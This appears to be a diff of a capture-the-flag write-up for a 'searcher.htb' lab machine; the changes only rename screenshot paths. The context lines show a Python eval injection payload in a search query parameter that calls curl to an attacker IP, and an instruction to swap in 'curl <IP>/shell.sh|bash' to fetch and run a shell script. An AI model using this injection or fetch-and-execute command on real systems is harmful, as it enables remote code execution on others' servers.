@@ -22,11 +22,11 @@ We would have to add `searcher.htb` to our `/etc/hosts` file to view the website
 
 This website seems to be a type of search engine using Flask:
 
-<figure><img src="../../.gitbook/assets/image (50) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (50) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can submit queries at the bottom using a custom machine and stuff:
 
-<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (66) (4).png" alt=""><figcaption></figcaption></figure>
 
 Whatever query we do here, depending on the engine, it would generate a URL for us with a `query` parameter appended at the end:
 
@@ -44,7 +44,7 @@ Looks like we need to do some source code review on this library.&#x20;
 
 The repository seems to be on v2.5.0, while the website is running v2.4.0. As such, we probably need to dive into the logs of this website to find out what was changed from v2.4.0. Looking at the commit history, we see that there's a `remove eval from search cli method` commit made:
 
-<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (63) (4).png" alt=""><figcaption></figcaption></figure>
 
 Here are the changes made:
 
@@ -66,11 +66,11 @@ However, this exploit would require us to 'close' the previous `eval` function a
 d'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl+http%3a//10.10.16.41/test")','a','single'))%2b'
 ```
 
-<figure><img src="../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (57) (6).png" alt=""><figcaption></figcaption></figure>
 
 All we have to do is change the command to `curl <IP>/shell.sh|bash`.
 
-<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (47) (4).png" alt=""><figcaption></figcaption></figure>
 
 With this, we can grab the user flag.
 
